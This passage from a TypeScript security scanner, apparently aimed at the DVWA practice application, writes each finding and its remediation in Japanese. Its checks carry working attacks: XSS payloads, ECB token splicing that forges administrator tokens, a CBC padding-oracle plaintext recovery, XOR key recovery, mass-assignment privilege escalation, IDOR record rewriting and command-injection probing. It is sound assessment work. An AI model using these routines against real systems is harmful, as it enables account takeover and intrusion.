        remediation: '出力時のコンテキストに応じたエスケープ（HTMLエンティティ化）を行い、入力値検証と出力エンコーディングを分離してください。CSPも多層防御として併用してください。',
        limitations: '応答HTMLへの未エスケープ出力を根拠としており、実際のブラウザーでの実行確認は含みません。',
      });
      return;
    }
  }
  skip(check, 'エスケープまたは除去を確認');
}

const XSS_STORED_LADDERS: readonly { payload: string; needle: string }[] = [
  { payload: '<script>{m}();</script>', needle: '<script>{m}' },
  { payload: '<scr<script>ipt>{m}();</scr</script>ipt>', needle: '<script>{m}' },
  { payload: '<img src=x onerror={m}();>', needle: '<img src=x onerror={m}' },
];

/** 格納型XSS (CWE-79)。 */
export async function runXssStoredCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'xss-stored',
    title: `格納型XSS（保存値の未エスケープ出力）${levelSuffix(ctx.securityLevel)}`,
    category: '入力値検証',
    severity: 'high',
    cwe: '79',
    url: urlOf(ctx, 'vulnerabilities/xss_s/'),
    method: 'POST',
    param: 'mtxMessage',
  });
  if (!(await reachable(ctx, 'vulnerabilities/xss_s/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  const marker = ctx.marker;
  for (const ladder of XSS_STORED_LADDERS) {
    const payload = ladder.payload.replaceAll('{m}', marker);
    const needle = ladder.needle.replaceAll('{m}', marker);
    await postForm(ctx, 'vulnerabilities/xss_s/', {
      txtName: `sp${marker}`,
      mtxMessage: payload,
      btnSign: 'Sign',
    });
    const page = await get(ctx, 'vulnerabilities/xss_s/');
    if (page.body.includes(needle)) {
      detect(check, {
        description:
          '投稿メッセージがサニタイズされずに保存され、一覧画面で閲覧する全利用者のブラウザーでスクリプトが実行されます（格納型XSS）。反射型と異なり、一度の投稿で不特定多数の利用者へ影響が及びます。',
        evidence: `POST（mtxMessage=<script>…</script>、マーカー ${marker}）後に GET /vulnerabilities/xss_s/ の応答本体に、エスケープされていない ${needle} が残存していました。`,
        remediation: '保存時・出力時の両方でコンテキストに応じたエンコーディングを行い、HTMLタグを許可する場合はホワイトリスト方式のサニタイザーを使用してください。',
        limitations: `検証用の投稿1件（マーカー sp${marker} を含む）がゲストブックに残ります。削除可能です。`,
      });
      return;
    }
  }
  skip(check, 'エスケープまたは除去を確認');
}

/** DOM型XSS (CWE-79)。ページ埋込みスクリプトを解析する。 */
export async function runXssDomCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'xss-dom',
    title: `DOM型XSS（URLを安全でない方法でDOMへ挿入）${levelSuffix(ctx.securityLevel)}`,
    category: '入力値検証',
    severity: 'medium',
    cwe: '79',
    url: urlOf(ctx, 'vulnerabilities/xss_d/'),
  });
  const page = await get(ctx, 'vulnerabilities/xss_d/');
  if (page.status !== 200) {
    skip(check, '対象画面へ到達できず');
    return;
  }
  const sink = findDomSink(extractInlineScripts(page.body));
  if (sink === undefined) {
    skip(check, 'ページ内スクリプトに危険なシンクを確認できず');
    return;
  }
  detectDomSink(check, 'vulnerabilities/xss_d/', sink);
}

/** DOM型XSS (CWE-79)。level 別に配布される .js ファイルを解析する。 */
export async function runXssDomScriptsCheck(ctx: CheckContext): Promise<void> {
  for (const source of ['low', 'medium', 'high']) {
    const scriptPath = `vulnerabilities/xss_d/source/${source}.js`;
    const check = beginCheck(ctx, {
      checkId: 'xss-dom',
      title: `DOM型XSS（URLを安全でない方法でDOMへ挿入・配布スクリプト ${source}.js）`,
      category: '入力値検証',
      severity: 'medium',
      cwe: '79',
      url: urlOf(ctx, scriptPath),
    });
    const script = await get(ctx, scriptPath);
    if (script.status !== 200) {
      skip(check, 'スクリプト未配布');
      continue;
    }
    const sink = findDomSink(script.body);
    if (sink === undefined) {
      skip(check, '危険なシンクを確認できず');
      continue;
    }
    detectDomSink(check, scriptPath, sink);
  }
}

function detectDomSink(
  check: PendingCheck,
  scriptPath: string,
  sink: string,
): void {
  detect(check, {
    description:
      'ページに配布されるJavaScriptが、URL（location.href・location.searchなど）由来の値を検証なしに document.write 等へ渡しています。URLのクエリやフラグメントを介して、ページを開いた利用者のブラウザーでスクリプトが実行されます（DOM型XSS）。',
    evidence: `${scriptPath} の配布内容に危険なデータフローを確認: ${sink}`,
    remediation:
      'URL由来の値をDOMへ出力する前に、許可する値のホワイトリスト検証とコンテキスト別のエンコーディング（textContent使用等）を行ってください。document.write・innerHTML の使用を避けてください。',
    limitations: '配布スクリプトの静的解析に基づく検出であり、実際のブラウザーでの実行確認は含みません。',
  });
}

/** CSP迂回 (CWE-693/79)。 */
export async function runCspBypassCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'csp-bypass',
    title: `CSPの許可元が広く、任意スクリプトURLの取込みが可能${levelSuffix(ctx.securityLevel)}`,
    category: 'セキュリティ設定',
    severity: 'medium',
    cwe: '693',
    url: urlOf(ctx, 'vulnerabilities/csp/'),
    method: 'POST',
    param: 'include',
  });
  const page = await get(ctx, 'vulnerabilities/csp/');
  if (page.status !== 200) {
    skip(check, '対象画面へ到達できず');
    return;
  }
  const externalOrigins = parseExternalScriptOrigins(page.contentSecurityPolicy);
  const include = await postForm(ctx, 'vulnerabilities/csp/', { include: `https://scopepilot-check.invalid/${ctx.marker}.js` });
  const reflected =
    include.body.includes(`<script src='https://scopepilot-check.invalid/${ctx.marker}.js'>`) ||
    include.body.includes(`<script src="https://scopepilot-check.invalid/${ctx.marker}.js">`);
  if (!reflected || externalOrigins.length === 0) {
    skip(check, reflected ? 'CSPが外部許可元を含まず' : 'スクリプトURLの取込みを確認できず');
    return;
  }
  detect(check, {
    description:
      "Content-Security-Policy の script-src が第三者配信元を広く許可しており、さらに利用者が送信したURLをそのまま <script src> として取込みます。許可された外部ホスティング（Pastebin・jsdelivr等）に攻撃コードを置くだけでCSPを迂回して任意JavaScriptを実行できます。",
    evidence: `CSP: ${truncate(page.contentSecurityPolicy, 200)}。POST include=https://scopepilot-check.invalid/${ctx.marker}.js への応答に <script src='…'> として反映され、script-src は外部許可元 ${externalOrigins.length}件（${externalOrigins.slice(0, 5).join(', ')}…）を含みました。`,
    remediation: "script-src は 'self' と必要最小限の自社管理配信元に限定し、利用者入力値をスクリプトURLへ直接反映しないでください。nonce や strict-dynamic の利用を検討してください。",
    limitations: '実際に外部ホスティングへスクリプトを設置しての実行確認は行っていません（実行には第三者サービスへの投稿が必要なため）。',
  });
}

/** クライアント側セキュリティ制御への依存 (CWE-602)。 */
export async function runClientSideTokenCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'client-side-token',
    title: `クライアント側セキュリティ制御の迂回（トークン生成の再現）${levelSuffix(ctx.securityLevel)}`,
    category: 'クライアント側制御',
    severity: 'medium',
    cwe: '602',
    url: urlOf(ctx, 'vulnerabilities/javascript/'),
    method: 'POST',
    param: 'phrase/token',
  });
  if (!(await reachable(ctx, 'vulnerabilities/javascript/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  const page = await get(ctx, 'vulnerabilities/javascript/');
  const phrase =
    /name=["']phrase["'][^>]*value=["']([^"']+)["']/.exec(page.body)?.[1] ??
    /value=["']([^"']+)["'][^>]*name=["']phrase["']/.exec(page.body)?.[1] ??
    '';
  // サーバーが配布したJavaScriptと同じ手順（rot13→MD5 など）を診断側で再現してトークンを作る。
  for (const token of clientSideTokenCandidates('success')) {
    const response = await postForm(ctx, 'vulnerabilities/javascript/', {
      phrase: 'success',
      token,
      change: 'Change',
    });
    if (response.body.includes('Well done')) {
      detect(check, {
        description:
          '成功条件とトークン生成ロジック（MD5・反転・SHA-256等の組合せ）がブラウザー配布のJavaScriptに埋め込まれています。配布コードを解析・再現するだけでトークンを生成でき、サーバー側検証を通過しました。クライアントへ送ったコードは利用者が改変できることを示しています。',
        evidence: `配布スクリプトの手順を再現して phrase=success, token=${truncate(token, 24)}… を送信し、「Well done!」応答を取得しました（画面既定値: ${truncate(phrase, 40)}、マーカー ${ctx.marker}）。`,
        remediation: 'セキュリティ上重要な検証はすべてサーバー側で実施し、トークン生成ロジックや成功条件をクライアントへ配布しないでください。クライアント側チェックはUX目的に限定してください。',
        limitations: 'トークン生成の再現に成功したことをもって検出としており、難読化の解析そのものは自動化していません。',
      });
      return;
    }
  }
  skip(check, '配布ロジックの再現では通過せず');
}

interface FakeUserRow {
  readonly id: number;
  readonly firstName: string;
  readonly surname: string;
}

function extractOtherUser(json: string): FakeUserRow | undefined {
  // 実装によって user_id は数値にも文字列にもなるため両方を受け付ける。
  const pattern = /\{\s*"user_id"\s*:\s*"?(\d+)"?\s*,\s*"first_name"\s*:\s*"([^"]*)"\s*,\s*"surname"\s*:\s*"([^"]*)"\s*\}/g;
  const matches = [...json.matchAll(pattern)];
  const preferred = matches.find((m) => Number(m[1]) > 1) ?? matches[0];
  if (preferred === undefined) {
    return undefined;
  }
  return { id: Number(preferred[1]), firstName: preferred[2] ?? '', surname: preferred[3] ?? '' };
}

/** 認可不備 (CWE-862/639)。書換え後は必ず元の値へ戻す。 */
export async function runAuthorizationBypassCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'authorization-bypass',
    title: `認可不備：メニュー外APIでの全利用者データ取得・他利用者情報の書換え${levelSuffix(ctx.securityLevel)}`,
    category: '認可',
    severity: 'high',
    cwe: '862',
    url: urlOf(ctx, 'vulnerabilities/authbypass/get_user_data.php'),
    method: 'POST',
  });
  const data = await get(ctx, 'vulnerabilities/authbypass/get_user_data.php');
  if (data.status !== 200 || !data.body.includes('[')) {
    skip(check, '利用者データAPIは拒否または保護されている');
    return;
  }
  const target = extractOtherUser(data.body);
  if (target === undefined) {
    skip(check, '比較対象利用者なし');
    return;
  }
  // 名前カラムの長さ制約（DVWAでは15文字）を考慮し、短いマーカーを使う。
  const nameMarker = `Sp${ctx.marker.slice(0, 6)}`;
  const update = await postJson(
    ctx,
    'vulnerabilities/authbypass/change_user_details.php',
    `{"id": ${target.id}, "first_name": "${nameMarker}", "surname": "${target.surname}"}`,
  );
  const changed = update.body.includes('"result": "ok"') || update.body.includes('"result":"ok"');
  if (!changed) {
    skip(check, '更新APIは拒否');
    return;
  }
  const after = await get(ctx, 'vulnerabilities/authbypass/get_user_data.php');
  const verified = after.body.includes(nameMarker);
  // 書き換えた値を元へ戻す。
  await postJson(
    ctx,
    'vulnerabilities/authbypass/change_user_details.php',
    `{"id": ${target.id}, "first_name": "${target.firstName}", "surname": "${target.surname}"}`,
  );
  const userCount = (data.body.match(/"user_id"\s*:/g) ?? []).length;
  detect(check, {
    description: `画面メニューに現れないAPIが保護されておらず、全利用者の一覧（氏名等）を取得でき、さらに所有権・権限の検証なしに他利用者（ID ${target.id}）の登録情報を書き換えられました。メニュー隠蔽による保護は認可制御になりません。`,
    evidence: `GET get_user_data.php → 利用者${userCount}名分のデータ。POST change_user_details.php（id=${target.id}, first_name=${nameMarker}）→ result:ok、再取得で書換えを確認（verified=${String(verified)}）。検証後、元の値へ復元しました。`,
    remediation: 'URL単位・API単位にサーバー側で認可を検証し、他利用者のリソースへは所有権確認を必須にしてください。メニューの非表示は認可制御として扱わないでください。',
    limitations: '検証後、書き換えた氏名は元の値へ復元しています。',
  });
}

/** アクセス制御の不備 (CWE-862/639)。 */
export async function runBacOpenAccessCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'bac-open-access',
    title: `破られたアクセス制御：アクセスログ画面の無保護な公開${levelSuffix(ctx.securityLevel)}`,
    category: '認可',
    severity: 'medium',
    cwe: '862',
    url: urlOf(ctx, 'vulnerabilities/bac/'),
  });
  if (!(await reachable(ctx, 'vulnerabilities/bac/'))) {
    skip(check, 'ログ画面は保護されているか存在せず');
    return;
  }
  const page = await get(ctx, 'vulnerabilities/bac/');
  if (page.status !== 200 || !page.body.toLowerCase().includes('access log')) {
    skip(check, 'ログ画面は保護されているか存在せず');
    return;
  }
  detect(check, {
    description:
      'メニューから除去されたアクセスログ確認画面がURL直打ちで閲覧できました。利用者ID・対象ID・IPアドレス等を含む操作ログが、権限なしに取得できます。',
    evidence: "GET /vulnerabilities/bac/ が200で応答し、本文に「Access Log」とログエントリ（user_id・target_id・ip_address 等）を含みました。",
    remediation: '画面単位でサーバー側認可（管理者権限など）を検証してください。未使用画面はルーティングごと削除してください。',
  });
}

/** オープンリダイレクト (CWE-601)。low/medium/high の各実装を個別に確認する。 */
export async function runOpenRedirectCheck(ctx: CheckContext): Promise<void> {
  const marker = ctx.marker;
  const targets: readonly { file: string; payload: string }[] = [
    { file: 'low.php', payload: `http://scopepilot-check.invalid/${marker}` },
    { file: 'medium.php', payload: `//scopepilot-check.invalid/${marker}` },
    { file: 'high.php', payload: `//scopepilot-check.invalid/info.php?${marker}` },
  ];
  for (const target of targets) {
    const path = `vulnerabilities/open_redirect/source/${target.file}`;
    const check = beginCheck(ctx, {
      checkId: 'open-redirect',
      title: `オープンリダイレクト（${target.file} の検証不十分な転送）`,
      category: 'リダイレクト',
      severity: 'medium',
      cwe: '601',
      url: urlOf(ctx, path),
      method: 'GET',
      param: 'redirect',
    });
    const response = await get(ctx, `${path}?redirect=${encodeURIComponent(target.payload)}`);
    const host = tryGetHost(response.location);
    const external = response.status >= 300 && response.status < 400 && host !== undefined && host !== new URL(ctx.transport.baseUrl).host;
    if (!external) {
      skip(check, '外部への転送は拒否');
      continue;
    }
    detect(check, {
      description: 'redirect パラメーターで指定された外部URLへ、検証ほぼなしに HTTP 302 で転送します。フィッシングサイトへの誘導に悪用できます。',
      evidence: `GET ${path}?redirect=［外部URL］→ ${response.status} Location: ${truncate(response.location, 120)}（検証用ドメイン scopepilot-check.invalid、マーカー ${marker}）。`,
      remediation: '転送先を自社ドメインの相対パスのみに制限する許可リスト方式にしてください。外部URLを許可する必要がある場合は確認画面を挟んでください。',
    });
  }
}

// ---------------------------------------------------------------------------
// 暗号チェック
// ---------------------------------------------------------------------------

/** 反復XOR・固定鍵 (CWE-327/321)。 */
export async function runCryptoXorCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'crypto-xor',
    title: `反復XORと固定鍵による脆弱な独自暗号（既知平文からの鍵回収）${levelSuffix(ctx.securityLevel)}`,
    category: '暗号',
    severity: 'medium',
    cwe: '327',
    url: urlOf(ctx, 'vulnerabilities/cryptography/'),
    method: 'POST',
    param: 'message',
  });
  const initial = await get(ctx, 'vulnerabilities/cryptography/');
  if (initial.status !== 200) {
    skip(check, '対象画面へ到達できず');
    return;
  }
  if (!initial.body.includes("name='message'") && !initial.body.includes('name="message"')) {
    skip(check, '平文入力欄が存在せず');
    return;
  }
  // 実装によっては平文がフォームへ再表示されるため、base64として妥当な値だけを対象にする。
  const intercepted = extractTextareas(initial.body).filter(looksLikeBase64).at(-1);
  // 仕組み上公開して差し支えない既知平文を暗号化させ、鍵ストリームを回収する。
  const known = `ScopePilot known plaintext for repeating key recovery ${ctx.marker}0123456789`;
  const encoded = await postForm(ctx, 'vulnerabilities/cryptography/', { message: known, direction: 'encode' });
  const cipherBase64 = extractTextareas(encoded.body).find(looksLikeBase64);
  if (cipherBase64 === undefined) {
    skip(check, '暗号化サービスを利用できず');
    return;
  }
  const cipher = new Uint8Array(Buffer.from(cipherBase64, 'base64'));
  const knownBytes = new TextEncoder().encode(known);
  if (cipher.length < 16 || knownBytes.length < cipher.length) {
    skip(check, '暗号化サービスを利用できず');
    return;
  }
  const keyStream = xorBytes(cipher.slice(0, knownBytes.length), knownBytes);
  const key = detectRepeatingKey(keyStream);
  if (key === undefined) {
    skip(check, '反復鍵としての規則性を確認できず');
    return;
  }
  let interceptedProof = '';
  if (intercepted !== undefined) {
    const decrypted = xorBytes(new Uint8Array(Buffer.from(intercepted, 'base64')), key);
    if ([...decrypted].every((b) => b >= 0x20 || b === 0x0a || b === 0x0d || b === 0x09)) {
      interceptedProof = `、傍受済みメッセージ（${intercepted}）を回収鍵で復号できた（先頭: ${truncate(new TextDecoder().decode(decrypted), 40)}）`;
    }
  }
  detect(check, {
    description:
      '平文を固定鍵との反復XORで変換しBase64化する独自暗号が使われています。任意の平文を暗号化させられるため既知平文攻撃で鍵をそのまま回収でき、傍受したメッセージも復号できます。',
    evidence: `既知平文（${truncate(known, 30)}…）を暗号化させ、鍵ストリームから反復鍵「${new TextDecoder().decode(key)}」を回収しました${interceptedProof}。`,
    remediation: '独自の暗号方式を実装せず、TLS上で業界標準の認証付き暗号（AES-GCM 等）を使用してください。鍵は用途ごとに固定値を埋め込まず安全に管理してください。',
  });
}

/** AES-ECBトークンのブロック組み替え (CWE-327)。 */
export async function runCryptoEcbCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'crypto-ecb',
    title: `ECBモード暗号トークンのブロック組み替え（権限偽造）${levelSuffix(ctx.securityLevel)}`,
    category: '暗号',
    severity: 'high',
    cwe: '327',
    url: urlOf(ctx, 'vulnerabilities/cryptography/'),
    method: 'POST',
    param: 'token',
  });
  const page = await get(ctx, 'vulnerabilities/cryptography/');
  if (page.status !== 200) {
    skip(check, '対象画面へ到達できず');
    return;
  }
  const tokens = extractHexTokens(page.body).slice(0, 4);
  if (tokens.length < 2) {
    skip(check, '比較可能なトークンが不足');
    return;
  }
  const blockLists = tokens.map((t) => splitBlocks(t));
  const shared = findSharedBlocks(blockLists);
  if (shared.length === 0) {
    skip(check, 'ブロック単位の規則性を確認できず');
    return;
  }
  const forged = await tryForgeAdminToken(ctx, blockLists);
  const sharedEvidence = `異なるトークン間で同一暗号文ブロック ${shared.length}件（例: ${shared[0]!.slice(0, 16)}…）を確認。`;
  if (forged === undefined) {
    detect(check, {
      description:
        'セッショントークンがAES-ECB（IVなし・ブロック独立・完全性検証なし）で暗号化されています。同一平文ブロックが同一暗号文になるため、複数利用者のトークンを収集するだけで平文の構造が特定でき、ブロックの組み替えによる権限偽造が可能になります。',
      evidence: `${sharedEvidence}ブロック組み替えによる管理者権限の偽造までは確認できませんでしたが、ECBであること自体が構造的な弱点です。`,
      remediation: 'トークンには認証付き暗号（AES-GCM 等）を使用し、改ざん検証を必須にしてください。ECBモードは認証・機密性のどちらの用途にも使用しないでください。',
      limitations: 'ブロック組み替えの成功までは確認していません。',
    });
    return;
  }
  detect(check, {
    description:
      'セッショントークンがAES-ECB（IVなし・ブロック独立・完全性検証なし）で暗号化されているため、入手済みトークンのブロックを組み替えるだけで、別利用者の権限（管理者）を持つ有効トークンを作成できました。',
    evidence: `${sharedEvidence}組み替えトークン（${forged.tokenHex.length / 2}バイト）を送信し「${truncate(forged.response, 60)}」応答を取得しました。`,
    remediation: 'トークンには認証付き暗号（AES-GCM 等）を使用し、改ざん検証を必須にしてください。トークン内に権限値を持たせる場合はサーバー側で再検証してください。',
  });
}

async function tryForgeAdminToken(
  ctx: CheckContext,
  blockLists: readonly (readonly string[])[],
): Promise<{ tokenHex: string; response: string } | undefined> {
  const candidates: string[] = [];
  const splice = (blocks: readonly string[], donor: readonly string[], position: number, count: number): string => {
    const copy = [...blocks];
    for (let index = 0; index < count && position + index < copy.length && position + index < donor.length; index += 1) {
      copy[position + index] = donor[position + index]!;
    }
    return copy.join('');
  };
  blockLists.forEach((baseBlocks, baseIndex) => {
    blockLists.forEach((donorBlocks, donorIndex) => {
      if (donorIndex === baseIndex) {
        return;
      }
      for (let position = 0; position < baseBlocks.length && position < donorBlocks.length; position += 1) {
        candidates.push(splice(baseBlocks, donorBlocks, position, 1));
        if (position + 1 < baseBlocks.length && position + 1 < donorBlocks.length) {
          candidates.push(splice(baseBlocks, donorBlocks, position, 2));
        }
      }
    });
  });
  for (const candidate of [...new Set(candidates)].slice(0, 120)) {
    if (candidate.length % 32 !== 0) {
      continue;
    }
    const response = await postForm(ctx, 'vulnerabilities/cryptography/', { token: candidate });
    if (response.body.includes('Welcome administrator')) {
      return { tokenHex: candidate, response: response.body.replace(/\s+/g, ' ').trim() };
    }
  }
  return undefined;
}

/** CBCパディングオラクル (CWE-203)。 */
export async function runCryptoCbcOracleCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'crypto-cbc-oracle',
    title: `CBCパディングオラクル（復号成否の応答差から平文回収）${levelSuffix(ctx.securityLevel)}`,
    category: '暗号',
    severity: 'high',
    cwe: '203',
    url: urlOf(ctx, 'vulnerabilities/cryptography/source/check_token_high.php'),
    method: 'POST',
    param: 'token/iv',
  });
  const page = await get(ctx, 'vulnerabilities/cryptography/');
  if (page.status !== 200) {
    skip(check, '対象画面へ到達できず');
    return;
  }
  const tokenBase64 = /"token"\s*:\s*"([A-Za-z0-9+/=]+)"/.exec(page.body)?.[1];
  const ivBase64 = /"iv"\s*:\s*"([A-Za-z0-9+/=]+)"/.exec(page.body)?.[1];
  if (tokenBase64 === undefined || ivBase64 === undefined) {
    skip(check, 'トークン入力欄が存在せず');
    return;
  }
  const endpoint = 'vulnerabilities/cryptography/source/check_token_high.php';
  const cipher = new Uint8Array(Buffer.from(tokenBase64, 'base64'));
  const iv = new Uint8Array(Buffer.from(ivBase64, 'base64'));
  if (cipher.length === 0 || cipher.length % 16 !== 0 || iv.length !== 16) {
    skip(check, 'トークン形式を解析できず');
    return;
  }
  // オラクル確認: IV・暗号文を改変した際に、パディング不正とその他のエラーが区別された応答で返るか。
  const probeInvalid = await postToken(ctx, endpoint, cipher, flipByte(iv, 15));
  const probeOther = await postToken(ctx, endpoint, cipher, flipByte(iv, 0));
  if (probeInvalid === undefined || probeOther === undefined || oracleClass(probeInvalid) === oracleClass(probeOther)) {
    skip(check, '復号成否を区別できる応答差なし');
    return;
  }
  const recovered = await recoverFirstBlock(ctx, endpoint, cipher, iv, 8);
  const recoveredText = recovered === undefined ? '' : asciiPrefix(recovered.plaintext);
  const exploitProof = recoveredText.length >= 4 ? `さらにオラクルを利用した復元で平文の先頭「${recoveredText}」を回収しました。` : '';
  detect(check, {
    description:
      '暗号トークンの復号処理が、パディング不正（復号失敗）と形式エラー・利用者不在などを異なるステータス・メッセージで返します。この応答差がオラクルとなり、暗号文やIVを少しずつ改変して送ることで暗号化された内容を復元・偽造できます。',
    evidence: `IV改変プローブ: ステータス${probeInvalid}（パディング不正）と ステータス${probeOther}（その他）が区別されて返ることを確認。${exploitProof}`,
    remediation: '復号の成否・失敗理由を応答で区別しない（単一の汎用エラーに統一する）ようにしてください。認証付き暗号（AES-GCM 等）で完全性検証を先に行ってください。',
  });
}

function flipByte(value: Uint8Array, index: number): Uint8Array {
  const copy = new Uint8Array(value);
  copy[index] = copy[index]! ^ 0xff;
  return copy;
}

async function postToken(
  ctx: CheckContext,
  endpoint: string,
  cipher: Uint8Array,
  iv: Uint8Array,
): Promise<string | undefined> {
  const body = `{"token": "${Buffer.from(cipher).toString('base64')}", "iv": "${Buffer.from(iv).toString('base64')}"}`;
  const response = await postJson(ctx, endpoint, body);
  if (response.status !== 200) {
    return undefined;
  }
  return /"status"\s*:\s*(\d+)/.exec(response.body)?.[1] ?? '';
}

/** 526 = 復号失敗（パディング不正）、それ以外 = 復号には成功。 */
function oracleClass(status: string): string {
  return status === '526' ? 'invalid' : 'valid';
}

async function recoverFirstBlock(
  ctx: CheckContext,
  endpoint: string,
  cipher: Uint8Array,
  originalIv: Uint8Array,
  maxBytes: number,
): Promise<{ plaintext: Uint8Array } | undefined> {
  // CBC先頭ブロックの復元: P1 = D(C1) XOR IV。IVを操作してパディングを成立させ D(C1) を1バイトずつ得る。
  const recovered = new Uint8Array(16);
  let known = 0;
  let budget = 1500;
  for (let position = 15; position >= 16 - maxBytes && budget > 0; position -= 1) {
    const padValue = 16 - position;
    const probe = new Uint8Array(16);
    for (let index = 15; index > position; index -= 1) {
      probe[index] = recovered[index]! ^ padValue;
    }
    let found: number | undefined;
    for (let candidate = 0; candidate < 256 && budget > 0; candidate += 1) {
      probe[position] = candidate;
      budget -= 1;
      const status = await postToken(ctx, endpoint, cipher, new Uint8Array(probe));
      if (status !== undefined && oracleClass(status) === 'valid') {
        const candidateByte = candidate ^ padValue;
        const verify = new Uint8Array(probe);
        for (let index = position; index <= 15; index += 1) {
          verify[index] = verify[index]! ^ padValue ^ (padValue + 1);
        }
        budget -= 1;
        const verifyStatus = await postToken(ctx, endpoint, cipher, verify);
        if (verifyStatus !== undefined && oracleClass(verifyStatus) === 'valid') {
          found = candidateByte;
          break;
        }
      }
    }
    if (found === undefined) {
      break;
    }
    recovered[position] = found;
    known += 1;
  }
  if (known === 0) {
    return undefined;
  }
  const plaintext = new Uint8Array(16);
  for (let index = 0; index < 16; index += 1) {
    plaintext[index] = recovered[index]! ^ originalIv[index]!;
  }
  return { plaintext };
}

function asciiPrefix(bytes: Uint8Array): string {
  const printable: number[] = [];
  for (const byte of bytes) {
    if (byte >= 0x20 && byte < 0x7f) {
      printable.push(byte);
    } else {
      break;
    }
  }
  return new TextDecoder().decode(new Uint8Array(printable));
}

// ---------------------------------------------------------------------------
// API・インジェクション系チェック
// ---------------------------------------------------------------------------

/** 廃止APIの残存 (CWE-200)。 */
export async function runApiLegacyCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'api-legacy',
    title: '廃止APIの残存による機微情報（パスワードハッシュ）露出',
    category: 'API',
    severity: 'high',
    cwe: '200',
    url: urlOf(ctx, 'vulnerabilities/api/v1/user/'),
  });
  const response = await get(ctx, 'vulnerabilities/api/v1/user/');
  if (response.status !== 200) {
    skip(check, '旧版APIは到達不可');
    return;
  }
  const secretFields = findSensitiveJsonFields(response.body);
  if (secretFields.length === 0) {
    skip(check, '機微項目は応答に含まれず');
    return;
  }
  const userCount = (response.body.match(/"id"\s*:/g) ?? []).length;
  detect(check, {
    description: `現行画面が利用しない旧バージョンのAPI（v1）が到達可能なままで、応答に機微項目（${secretFields.join('・')}）が含まれていました。APIバージョンを切り替えるだけで、画面では非表示のパスワードハッシュ等を取得できます。`,
    evidence: `GET /vulnerabilities/api/v1/user/ → 200、応答JSONに項目 ${secretFields.join(', ')} を確認（${userCount}件分）。`,
    remediation: '廃止したAPIバージョンはルーティングごと削除してください。残す必要がある場合は機微項目を応答スキーマから除外し、アクセス制御・監視を適用してください。',
  });
}

function findUserWithLevel(json: string, excludeLevel: number): { id: number; name: string; level: number } | undefined {
  try {
    const parsed: unknown = JSON.parse(json);
    if (!Array.isArray(parsed)) {
      return undefined;
    }
    for (const item of parsed) {
      if (typeof item !== 'object' || item === null) {
        continue;
      }
      const row = item as Record<string, unknown>;
      if (typeof row['id'] !== 'number' || typeof row['level'] !== 'number' || typeof row['name'] !== 'string') {
        continue;
      }
      if (row['level'] === excludeLevel) {
        continue;
      }
      return { id: row['id'], name: row['name'], level: row['level'] };
    }
  } catch {
    return undefined;
  }
  return undefined;
}

/** マスアサインメント (CWE-915)。権限は必ず元へ戻す。 */
export async function runApiMassAssignmentCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'api-mass-assignment',
    title: 'マスアサインメント：更新APIでの権限属性（level）の書き換え',
    category: 'API',
    severity: 'high',
    cwe: '915',
    url: urlOf(ctx, 'vulnerabilities/api/v2/user/'),
    method: 'PUT',
    param: 'level',
  });
  const list = await get(ctx, 'vulnerabilities/api/v2/user/');
  if (list.status !== 200) {
    skip(check, '利用者API一覧を取得できず');
    return;
  }
  const target = findUserWithLevel(list.body, 0);
  if (target === undefined) {
    skip(check, '権限昇格の検証対象が見つからず');
    return;
  }
  const updated = await ctx.transport.request({
    method: 'PUT',
    path: `vulnerabilities/api/v2/user/${String(target.id)}`,
    json: `{"name": "${target.name}", "level": 0}`,
  });
  const escalated = /"level"\s*:\s*0/.test(updated.body);
  // 権限を元へ戻す。
  await ctx.transport.request({
    method: 'PUT',
    path: `vulnerabilities/api/v2/user/${String(target.id)}`,
    json: `{"name": "${target.name}", "level": ${String(target.level)}}`,
  });
  if (!escalated) {
    skip(check, '権限属性の書き換えは拒否');
    return;
  }
  detect(check, {
    description: `利用者更新API（PUT /vulnerabilities/api/v2/user/${String(target.id)}）が、リクエストJSONに含まれた権限属性 level を通常画面と同じ更新処理で書き換えます。利用者が level: 0（管理者）を追加送信するだけで自分を管理者へ昇格できました。`,
    evidence: `PUT /vulnerabilities/api/v2/user/${String(target.id)}（name=${target.name}, level=0）→ 応答 "level":0 を確認。検証後、level を元の ${String(target.level)} へ復元しました。`,
    remediation: '更新APIは受け取る属性を明示的なホワイトリスト（名前等）に限定し、権限・有効状態などの特権属性は別の管理経路でのみ変更できるようにしてください。',
    limitations: '検証後、権限値は元へ復元しています。',
  });
}

/** API経由のOSコマンドインジェクション (CWE-78)。 */
export async function runApiCommandInjectionCheck(ctx: CheckContext): Promise<void> {
  const marker = ctx.marker;
  const check = beginCheck(ctx, {
    checkId: 'api-command-injection',
    title: 'APIにおけるOSコマンドインジェクション（pingへの引数連結）',
    category: '入力値検証',
    severity: 'high',
    cwe: '78',
    url: urlOf(ctx, 'vulnerabilities/api/v2/health/connectivity'),
    method: 'POST',
    param: 'target',
  });
  const payloads = selectPayloads(WORKFLOW_PAYLOAD_CATALOG, {
    capability: 'command-injection',
    context: 'json',
    platform: 'posix',
    oracle: 'marker-in-response',
    maximumRisk: 'read-only',
    tags: ['marker'],
  }).map((payload) => renderPayload(payload, { marker: `SP${marker}` }));
  // 戦略1: コマンド実行結果（echo の出力）が応答に現れる実装。
  for (const payload of payloads) {
    const response = await postJson(ctx, 'vulnerabilities/api/v2/health/connectivity', JSON.stringify({ target: payload }));
    if (response.body.includes(`SP${marker}`)) {
      detect(check, {
        description:
          '接続確認APIが target の値を検証せずに ping コマンドへ連結して実行しています。シェルの連結記号（&&・;・| 等）を含めるだけで任意のOSコマンドを実行でき、応答本体にその実行結果が現れました。',
